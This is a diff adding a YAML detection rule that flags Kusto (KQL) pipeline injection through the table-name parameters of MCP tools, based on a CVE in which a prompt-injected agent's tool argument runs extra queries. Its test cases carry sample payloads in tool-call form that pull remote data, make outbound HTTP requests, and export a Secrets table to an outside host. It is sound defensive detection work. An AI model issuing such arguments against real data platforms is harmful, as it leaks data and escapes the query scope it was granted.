@@ -1,0 +1,228 @@
+title: "Kusto Pipeline Injection Through a Table Identifier Parameter"
+id: ATR-2026-02531
+rule_version: 2
+status: experimental
+description: >
+  Detects a Kusto (KQL) pipeline smuggled into an MCP tool parameter whose
+  schema declares it to be a bare table or database identifier: the value
+  carries a pipe character followed by another KQL operator, so the tool
+  executes more than the single table it was asked about.
+
+  Derived from CVE-2026-33980 (Azure Data Explorer MCP Server through 0.1.1),
+  where the `table_name` parameter of get_table_schema, sample_table_data and
+  get_table_details is interpolated straight into KQL via f-strings with no
+  validation. The advisory names a prompt-injected AI agent, not only a direct
+  attacker, as the party that reaches the vulnerable handler -- so the injected
+  pipeline arrives as an ordinary tool argument on a tool whose name says
+  "sample" or "schema".
+
+  WHY THIS IS NOT THE SQL RULE. KQL is not SQL and shares none of its injection
+  surface: there is no quote-and-UNION break-out to look for, because a Kusto
+  table reference is a bare identifier and the injection is a pipe character
+  followed by another operator. Every SQL-injection pattern in the corpus keys
+  on quote break-out, comment markers, or UNION SELECT. Measured before this
+  rule was written, a table_name value of
+  "Logs | union externaldata(x:string)[@'https://...']" produced zero matches
+  across the entire rule set.
+
+  WHAT THIS RULE DELIBERATELY DOES NOT DETECT, and the measurement that decided
+  it. Rule version 1 carried two further conditions -- a bare `externaldata`
+  operator given a remote URI, and `evaluate http_request` / `http_request_post`
+  -- on the theory that they were the ingestion and exfiltration halves of the
+  reach. Both were deleted after adversarial review, because both match the
+  documented, correct, publicly published spelling of supported Kusto features
+  and carry no attacker signal a single event can see:
+    - The externaldata condition fired on Microsoft Learn's own operator
+      reference page, on a first-party lookup-blob join, and on the widely
+      republished Sentinel hunting query that enriches CommonSecurityLog with
+      the public Tor exit-node list. The engine cannot tell an attacker-chosen
+      URI from a team's own storage account.
+    - The http_request condition fired on Microsoft Learn's plugin reference
+      page and on an ordinary enrichment query. The plugin is governed by the
+      cluster's callout policy, which the engine also cannot see.
+  Eleven of fourteen adversarial benign inputs fired against version 1,
+  including this rule's own file. Version 2 keeps only the parameter-shaped
+  condition, where the tool's own schema supplies the missing context: it said
+  the argument was an identifier, and an identifier has no pipe in it.
+
+  A management-command condition (.export, .ingest, .drop, .alter) was removed
+  even earlier, for the same reason: against the 3,042-sample skills-sh corpus
+  it fired fourteen times on a single "eventhouse-authoring-cli" skill whose
+  entire declared purpose is issuing those commands against Fabric KQL
+  databases.
+
+  BOUNDARY. A tool that genuinely accepts a KQL fragment in a parameter it
+  nonetheless named `table_name` will match. That is a schema bug on the server
+  side and is worth surfacing. Advisory text that quotes the payload in its
+  JSON-argument form will also match, as it does for every signature rule in
+  the corpus.
+author: "ATR Community"
+date: "2026/08/23"
+schema_version: "0.1"
+detection_tier: pattern
+maturity: test
+severity: high
+
+references:
+  cve:
+    - "CVE-2026-33980"
+  cwe:
+    - "CWE-943"
+    - "CWE-918"
+  owasp_llm:
+    - "LLM05:2025"
+  owasp_agentic:
+    - "ASI02:2026"
+  mitre_atlas:
+    - "AML.T0051.001 - Indirect"
+    - "AML.T0053 - LLM Plugin Compromise"
+
+compliance:
+  owasp_llm:
+    - id: "LLM05:2025"
+      context: "A model-supplied parameter is interpolated into a query string and executed; the handling of the model's output is where the whole vulnerability lives."
+      strength: primary
+  owasp_agentic:
+    - id: "ASI02:2026"
+      context: "The schema or sampling tool is invoked as designed while its single argument silently widens what the tool executes."
+      strength: primary
+  eu_ai_act:
+    - article: "15"
+      context: "Article 15 robustness for an analytics agent means the query scope it was granted holds against the content of its own generated parameters."
+      strength: primary
+    - article: "9"
+      context: "Query-language injection through agent tool parameters is a foreseeable risk for any data-platform MCP server and needs the continuous monitoring Article 9 requires."
+      strength: secondary
+    - article: "12"
+      context: "Logging the operator a generated query attempted to reach gives the record Article 12 requires to reconstruct what data was touched."
+      strength: secondary
+  nist_ai_rmf:
+    - function: Manage
+      subcategory: "MG.2.3"
+      context: "Runtime treatment for the risk that an agent's analytics query reaches a different data source than the one it was scoped to."
+      strength: primary
+    - function: Measure
+      subcategory: "MS.2.7"
+      context: "Detection events document the security of the parameter-to-query boundary in data-platform integrations."
+      strength: secondary
+    - function: Map
+      subcategory: "MP.5.1"
+      context: "Records Kusto pipeline injection as distinct from SQL injection: no quoting break-out is involved, so SQL-shaped controls do not apply."
+      strength: secondary
+  iso_42001:
+    - clause: "8.1"
+      context: "Operational control of an analytics agent requires that its granted table scope cannot be widened by the parameter it supplies."
+      strength: primary
+    - clause: "8.4"
+      context: "Impact assessment must cover cross-source data reach and outbound requests from the data platform; these detections are the evidence."
+      strength: secondary
+    - clause: "6.2"
+      context: "Keeping an analytics agent inside its authorised data scope is an AIMS security objective, operationalised here as a runtime detection."
+      strength: secondary
+
+tags:
+  category: privilege-escalation
+  subcategory: analytics-query-scope-escape
+  scan_target: both
+  confidence: medium
+
+agent_source:
+  type: mcp_exchange
+  framework:
+    - any
+  provider:
+    - any
+
+detection:
+  condition: any
+  conditions:
+    # A parameter the schema says is a bare table/database identifier instead
+    # carries a pipe and a following KQL operator. Three things keep this off
+    # ordinary text:
+    #   - the identifier run starts at the opening quote and holds no spaces, so
+    #     prose parked in the field ("orders and returns | union of both") cannot
+    #     reach the pipe; whitespace is allowed only immediately around the pipe,
+    #     which is where a real injected pipeline puts it.
+    #   - the key set is only the CVE's own parameter names, not the generic
+    #     "table" / "db" / "cluster" keys that appear all over config and catalog
+    #     JSON.
+    #   - the operator must be followed by whitespace or an open paren, i.e. it
+    #     must take an operand, so a pipe-delimited value list such as
+    #     "analytics|search|billing" -- where the token ends at a delimiter --
+    #     does not match.
+    - field: content
+      operator: regex
+      value: '(?i)"(?:table_?name|database_?name)"\s*:\s*"[\w.\-]{0,48}\s*\|\s*(?:union|externaldata|evaluate|search|print|invoke|mv-expand|find|\.show|\.export|\.ingest)[\s(]'
+      description: "A table or database identifier parameter continues with a pipe and another Kusto operator taking an operand — the CVE-2026-33980 injection point"
+
+  false_positives:
+    - "A data-platform MCP server whose parameter is named table_name but documented to accept a KQL fragment. The rule fires; the underlying schema is what should change"
+    - "Advisory or regression-test text that quotes the injected argument in its literal JSON form, as this rule's own test_cases block does"
+
+response:
+  actions:
+    - alert
+  actions_rationale: >-
+    response-action eligibility (docs/RESPONSE-ACTION-ELIGIBILITY.md): no FP measurement on the
+    benign corpus; ceiling = observe. Removed block_tool(interrupt). Detection unchanged —
+    recall cost is zero.
+  auto_response_threshold: high
+  message_template: >
+    [ATR-2026-02531] An MCP tool argument declared to be a Kusto table or
+    database identifier carries a pipe and a further KQL operator, so the
+    executed query reaches past the named table (CVE-2026-33980 shape).
+    Validate the identifier before interpolating it into the query.
+
+confidence: 75
+
+test_cases:
+  true_positives:
+    - input: "{\"name\":\"get_table_details\",\"arguments\":{\"table_name\":\"Logs | union externaldata(x:string)[@'https://198.51.100.7/e.csv']\"}}"
+      expected: triggered
+      description: "The CVE-2026-33980 injection point: identifier parameter continues into a union with remote data"
+    - input: "{\"name\":\"sample_table_data\",\"arguments\":{\"table_name\":\"T | evaluate http_request('https://198.51.100.7/x')\"}}"
+      expected: triggered
+      description: "Outbound HTTP plugin reached through a sampling tool's identifier parameter"
+    - input: "{\"name\":\"get_table_schema\",\"arguments\":{\"table_name\":\"Events | search 'token'\"}}"
+      expected: triggered
+      description: "Schema tool parameter continues into a cross-column search"
+    - input: "{\"tool\":\"describe\",\"arguments\":{\"databaseName\":\"prod|.export to csv (h@'https://198.51.100.7/x') <| Secrets\"}}"
+      expected: triggered
+      description: "Database identifier parameter continues into a management export, camelCase spelling"
+  true_negatives:
+    - input: "{\"tool\":\"sample_table_data\",\"arguments\":{\"table_name\":\"StormEvents\",\"limit\":10}}"
+      expected: not_triggered
+      description: "An ordinary identifier parameter, the overwhelmingly common case"
+    - input: "StormEvents | where StartTime > ago(7d) | summarize count() by State | order by count_ desc"
+      expected: not_triggered
+      description: "Everyday KQL analytics with pipes but no identifier parameter"
+    - input: "externaldata(UserId:string) [@\"https://storageaccount.blob.core.windows.net/container/users.txt\"] with (format=\"txt\")\n| where UserId !startswith \"internal-\""
+      expected: not_triggered
+      description: "The externaldata example from Microsoft Learn's own operator reference page — the documented, correct spelling of a supported feature"
+    - input: "let tor = externaldata (IpAddress:string) [@\"https://check.torproject.org/torbulkexitlist\"] with (format=\"txt\");\nCommonSecurityLog | where SourceIP in (tor) | summarize hits = count() by DeviceName"
+      expected: not_triggered
+      description: "The widely republished Sentinel hunting query that enriches firewall logs with the public Tor exit-node list"
+    - input: "The http_request plugin sends an HTTP GET request and converts the response into a table. Syntax: evaluate http_request ( Uri [, RequestHeaders [, Options ]] ). The destination host must be allow-listed by the cluster callout policy."
+      expected: not_triggered
+      description: "Microsoft Learn's http_request plugin reference page"
+    - input: "{\"service\":\"indexer\",\"db\":\"analytics|search|billing\",\"pool\":\"prod\",\"max_conns\":20}"
+      expected: not_triggered
+      description: "A pipe-delimited database list in service config where one database is named 'search'"
+    - input: "{\"table\":\"billing invoice events; find by tenant_id or invoice_no\",\"owner\":\"fin-data\",\"retention_days\":90}"
+      expected: not_triggered
+      description: "A data-catalog entry whose 'table' field holds prose, not an identifier"
+    - input: "{\"tool\":\"render_dashboard_panel\",\"arguments\":{\"table\":\"Perf | union Perf_Archive\",\"timespan\":\"P7D\"}}"
+      expected: not_triggered
+      description: "A dashboard agent unioning two sibling tables through a generic 'table' argument, not a declared identifier parameter"
+    - input: "The table_name argument is interpolated with an f-string, so a value such as Logs | union externaldata(x:string)[@'https://attacker.example/e.csv'] reads an attacker-chosen blob in as a table. Validate the identifier before interpolation."
+      expected: not_triggered
+      description: "Advisory prose naming the parameter and describing the payload without carrying it in argument form"
+    - input: "{\"name\":\"get_table_schema\",\"arguments\":{\"table_name\":\"SigninLogs\",\"database\":\"SecurityInsights\"}}"
+      expected: not_triggered
+      description: "Two plain identifier parameters passed to a schema tool"
+    - input: "{\"db\":\"${DB}\",\"csl\":\".alter table Events policy caching hot = 30d\"}"
+      expected: not_triggered
+      description: "A KQL management command from a legitimate Eventhouse-authoring skill — the measured false positive that removed the management-command condition"
+    - input: "{\"db\":\"${DB}\",\"csl\":\".ingest into table Events (h'https://mystorage.blob.core.windows.net/data/events.csv.gz;impersonate')\"}"
+      expected: not_triggered
+      description: "Documented ingestion from the tenant's own storage account, URL and all"
